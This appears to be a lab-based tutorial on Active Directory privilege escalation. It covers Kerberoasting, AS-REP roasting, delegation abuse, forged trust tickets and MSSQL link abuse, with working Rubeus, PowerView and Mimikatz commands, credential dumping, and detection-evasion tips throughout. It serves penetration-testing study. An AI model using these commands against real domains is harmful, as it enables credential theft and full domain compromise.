---
layout: mission
title: "Domain Privilege Escalation: Deep Dive into Kerberos & Trusts"
date: 2024-06-11
categories: [Active Directory, Privilege Escalation, Theory]
toc: true
---

# ⚔️ Domain Privilege Escalation: The Mechanics of the Climb

Escalating privileges in Active Directory is rarely about finding a "bug" in the code. Instead, it is almost always about **abusing legitimate features**.

This guide explores the deep mechanics of **Kerberoasting**, **Delegation**, and **Trusts**—features designed for usability that become weapons in the hands of an attacker.

---

## 🔥 1. Kerberoasting (Service Account Abuse)

### **The Theory: Why does this work?**
Kerberoasting exploits the way Kerberos handles Service Tickets (TGS).
1.  **The Request:** Any valid user in the domain can request a Ticket Granting Service (TGS) ticket for *any* service (SPN) in the domain. You do not need special privileges to ask.
2.  **The Encryption:** To allow the target service to read the ticket, the Domain Controller (KDC) encrypts a portion of the TGS using the **Service Account's NTLM hash** (or AES key).
3.  **The Flaw:** The KDC gives this encrypted ticket to *you* (the user) to pass to the service.
4.  **The Attack:** An attacker requests the ticket, takes it offline, and brute-forces the encrypted part. If the service account has a weak password, the attacker recovers the plaintext credentials.

### **A. Classic Kerberoasting**
**Target:** Accounts where `ServicePrincipalName` (SPN) is not `$null`.

**Exploitation Steps:**

1.  **Enumeration:** Find accounts that look like service accounts.

     ```
    # AD Module
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    
    # PowerView
    Get-DomainUser -SPN
    ```

2.  **Request Tickets (Rubeus):**
 
    Rubeus requests the TGS and extracts the hash.

    ```
    # Check stats first
    Rubeus.exe kerberoast /stats
    
    # Request a ticket for a specific user
    Rubeus.exe kerberoast /user:svcadmin /simple
    ```

3.  **OpSec (Avoid Encryption Downgrade):**

    Security tools (like MDI) flag requests for RC4 (legacy) tickets. To stay stealthy, specifically target accounts that *only* support RC4, or request AES tickets if possible.

    ```
    Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
    ```

4.  **Cracking:**

     ```
    john.exe --wordlist=10kworst-pass.txt hashes.txt
    ```

---

### **B. Targeted Kerberoasting (AS-REP Roasting)**

**The Theory:**

Standard Kerberos requires "Pre-Authentication": you must encrypt a timestamp with your password hash to prove you are who you say you are *before* the KDC gives you a ticket.

**The Configuration:** Some legacy accounts have **"Do not require Kerberos preauthentication"** enabled.

**The Attack:** For these users, you can send a request saying "I am User X," and the KDC will immediately send back an **AS-REP** (Authentication Service Reply).

**The Vulnerability:** This AS-REP contains a session key encrypted with the **User's Password Hash**. We can capture this packet and crack it offline to get the user's password.

![image](/images/image%20151.png)

**Exploitation:**

1.  **Identify Targets:**

    ```
    Get-DomainUser -PreauthNotRequired -Verbose
    ```

2.  **Force the Vulnerability (If you have permissions):**

    If you have **GenericWrite** or **GenericAll** on a target user, you can *force* them to be vulnerable by modifying their User Account Control (UAC) flags.

     ```
    # 4194304 corresponds to 'DONT_REQ_PREAUTH'
    Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
    ```

3.  **Roast:**

     ```
    # Using Rubeus to get a hashcat-ready format
    .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
    ```

---

### **C. Targeted Kerberoasting (Set-SPN)**

**The Theory:**

Normally, you can only Kerberoast accounts that are already Service Accounts (have an SPN).

**The Attack:** If you have **GenericWrite** or **GenericAll** permissions on a *normal* user object (or Admin user), you can **write** a fake SPN to their account (e.g., `dcorp/attack`).

**The Result:** Active Directory now treats them as a Service Account. You can request a TGS for them, get their password hash, and crack it.

**Exploitation:**
1.  **Set the SPN:**

     ```
    # PowerView
    Set-DomainObject -Identity support1user -Set @{serviceprincipalname='dcorp/whatever1'}
    ```

2.  **Kerberoast & Crack:**

    ```
    Rubeus.exe kerberoast /outfile:targetedhashes.txt
    john.exe --wordlist=passwords.txt targetedhashes.txt
    ```

---

## 🤝 2. Kerberos Delegation Abuse

**The Theory (The "Double Hop" Problem):**

Imagine a user logs into a Web Server. The Web Server needs to query a SQL database *as that user*.

**Problem:** The Web Server has the user's ticket for itself, but it cannot use that ticket to talk to the SQL Database.

**Solution (Delegation):** Delegation allows the Web Server to "impersonate" the user and request a new ticket for the SQL Server on the user's behalf.

![image](/images/image%20152.png)

### **A. Unconstrained Delegation**

**The Theory:**

**Configuration:** "Trust this computer for delegation to **any** service."

**Mechanism:** When a user connects to this server, the Domain Controller sends a copy of the user's **TGT** (Ticket Granting Ticket) to the server, and the server stores it in memory (LSASS) to use later.

**The Attack:** If an attacker compromises a server with Unconstrained Delegation, they can extract **any TGT** waiting in memory. If a Domain Admin connects to this server (or is forced to), the attacker steals the DA's TGT and owns the domain.

**Exploitation (The Printer Bug):**

1.  **Find Unconstrained Servers:**
   
    ```
    Get-DomainComputer -UnConstrained
    ```

2.  **Monitor for Tickets:**

     Run Rubeus on the compromised server (`dcorp-appsrv`) to watch for incoming tickets.

    ```
    Rubeus.exe monitor /interval:5 /nowrap
    ```

3.  **Coerce Authentication (Printer Bug):**

     Use `MS-RPRN.exe` to force the Domain Controller (`dcorp-dc`) to connect to the compromised server.

      ```
    MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
    ```

4.  **Steal & Use TGT:**

    Rubeus will catch the DC's TGT. Pass it to your session:

     ```
    Rubeus.exe ptt /ticket:<BASE64_TICKET>
    ```
6.  **DCSync:**

     ```
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
    ```

---

### **B. Constrained Delegation**

**The Theory:**

**Configuration:** "Trust this computer for delegation to **specified services only**" (e.g., `CIFS/dcorp-mssql`).

**Mechanism:** The server uses the **S4U (Service for User)** Kerberos extension.
   **S4U2Self:** The service asks the DC for a ticket *to itself* on behalf of a user (Protocol Transition).
   **S4U2Proxy:** The service uses that ticket to ask the DC for a ticket to the *backend service* (SQL).

**The Attack:** If we compromise the service account, we can forge the S4U requests. We can impersonate **any user** (like Administrator) to the **target service**.

**Exploitation:**

1.  **Enumerate:**
 
    ```
    Get-DomainUser -TrustedToAuth
    ```

2.  **Abuse S4U:**

    We use the hash of the compromised service (`websvc`) to ask for a ticket for `Administrator` to the target service (`dcorp-mssql`).

    ```
    Rubeus.exe s4u /user:websvc /aes256:<HASH> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
    ```

3.  **Access:**
 
    ```
    ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
    ```

---

### **C. Resource-Based Constrained Delegation (RBCD)**

**The Theory:**

**Traditional Delegation:** Configured on the **Account** (Source) side. "User A can delegate to Server B." Requires Domain Admin rights to set.

**Resource-Based:** Configured on the **Resource** (Target) side. "Server B allows User A to delegate to it."

**The Vulnerability:** The permission to configure this (`msDS-AllowedToDelegateTo`) resides on the Computer Object itself. If a user has **GenericWrite** over a Computer Object, they can configure RBCD to allow *themselves* (or a compromised account) to impersonate Admins to that computer.

**Exploitation:**

1.  **Configure RBCD:**

    We control `ciadmin`. `ciadmin` has Write access to `dcorp-mgmt`. We tell `dcorp-mgmt` to trust our compromised machine `dcorp-student1$`.

    ```
    Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$'
    ```
    
2.  **Impersonate:**

      Now `dcorp-student1$` can delegate to `dcorp-mgmt`. We use `dcorp-student1$`'s hash to request a ticket for `Administrator`.

     ```
    Rubeus.exe s4u /user:dcorp-student1$ /aes256:<HASH> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
    ```

---

## 🌐 3. Trust Abuse (Cross-Domain Attacks)


A. Child to Parent using Trust Tickets (Across Domain)

sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.

sIDHistory can be abused in two ways of escalating privileges within a forest -
    krbtgt hash of the child
    Trust tickets

**So, what is required to forge trust tickets is, obviously, the trust key. Look for trust key from child to parent.**

```

Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc

or

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'

or

Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

```

We can forge and inter-realm TGT 

```
C:\AD\Tools\old_tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit" 
```

**Abuse with Rubeus-**

 Note that we are still using the TGT forged initially

```
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

ls \\mcorp-dc.moneycorp.local\c$ 

```

> [!NOTE]
> BONUS! wmi command example --> gwmi -Class win32_operatingsystem -ComputerName mcorp-dc


B. Across Forest using Trust Tickets

Once again, we require the trust key for the inter-forest trust.

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' 
OR
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

TGT to access eurocorp with trust key of cross forest

```
 c:\ad\tools\old_tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /target:eurocorp.local  /rc4:45557d47079dfc365db9fe4ac7fc2486 /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
```

TGS 

```
 c:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:C:\AD\Tools\trust_forest_tkt.kirbi
```

Used to view files and folder shared with  Dollarcorp-DC

```
net view \\eurocorp-dc.eurocorp.local\
```

We can access only the folders which are shared with Dollarcorp-DC

```
 dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\

 type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt - To open file in eurocorp
```


![image](image%20400.png)

---

## 🗄️ 4. MSSQL Abuse (Data Links)

**The Theory:**

SQL Servers can be "Linked" to allow them to query each other.

**The Flaw:** Links are often configured with hardcoded credentials (sometimes SA/Admin).

**The Attack:** If you compromise SQL-A, and it is linked to SQL-B, you can execute queries on SQL-B. If SQL-B is linked to SQL-C, you can hop through the chain. This works even across Forest Trusts.

**Exploitation:**

1.  **Discovery:**

    Import the module in powershell. [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

     ```
     Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
    ```

    ```
    Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
    ```

3.  **Link Crawling:**

      Check for chains (SQL1 -> SQL2).

     ```powershell
    Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
    ```

4.  **Command Execution:**

      Enable `xp_cmdshell` on the target link to run OS commands.

      ```powershell
    Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
    ```
      
